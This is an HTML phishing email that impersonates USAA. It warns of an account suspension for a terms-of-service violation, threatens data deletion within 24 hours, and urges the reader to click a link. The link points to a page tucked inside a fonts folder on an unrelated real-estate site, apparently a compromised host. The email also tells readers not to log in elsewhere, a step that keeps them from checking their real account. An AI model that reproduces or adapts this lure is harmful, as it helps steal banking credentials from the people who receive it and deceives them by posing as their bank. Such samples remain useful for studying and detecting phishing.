 <br>Dear Customer,
 
 <br>The online account with us will be suspended. (reason: terms of service violation).
 <br>Although the account is still active, the data may be available for up to 24 hours,
 <br>after which it will be deleted.
 <br>
 <br>If you feel this suspension is an error, 
 <a target="_blank" href="http://www.realestate.co.th/public/assets/plugins/bootstrap/fonts/wx.htm">please click here as soon as possible</a>.
 <br>
 <br>*Warning* Do not login elsewhere after you verify the account within 24 hours,
 <br>to avoid duplicate access records in our database as this could cause the
 <br>account being suspended again.
 <br>
 <br>Thank you,
 <br>USAA.</html>
